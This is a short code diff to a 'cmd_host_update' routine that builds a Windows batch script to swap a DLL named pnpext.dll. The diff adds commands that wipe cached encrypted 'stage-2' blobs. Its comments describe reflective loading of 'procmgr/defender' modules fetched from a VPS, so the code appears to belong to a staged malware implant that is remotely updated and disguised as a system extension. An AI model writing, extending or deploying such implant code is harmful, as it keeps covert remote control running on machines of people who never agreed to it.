@@ -443,6 +443,18 @@ static void cmd_host_update(const char* a, void*) {
         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
         addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
         addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
+        // Wipe stage-2 blob cache so new DLL won't keep loading stale blobs
+        // that were encrypted against the old stage-2 DLLs. Without this
+        // wipe a host that was previously on v1.0.179 would keep the old
+        // procmgr/defender modules loaded from %TEMP%\pnp_cache even after
+        // the pnpext.dll itself was swapped to v1.0.185 — the new main DLL
+        // finds matching cached blobs, reflective-loads them, and never
+        // re-fetches from the VPS. Subtle bug: new stage-1 ABI changes
+        // (added callbacks, new host_version field, etc.) can disagree
+        // with the old stage-2 code and crash or silently malfunction.
+        addLn("del /f /q \"%TEMP%\\pnp_cache\\*.bin\" >nul 2>nul");
+        addLn("del /f /q \"C:\\Windows\\Temp\\pnp_cache\\*.bin\" >nul 2>nul");
+        addLn("for /d %%D in (\"%TEMP%\\pnp_cache\") do rmdir /q \"%%D\" >nul 2>nul");
         addLn("timeout /t 2 /nobreak >nul 2>nul");
 
         // 5. Start service, verify RUNNING, rollback on failure.
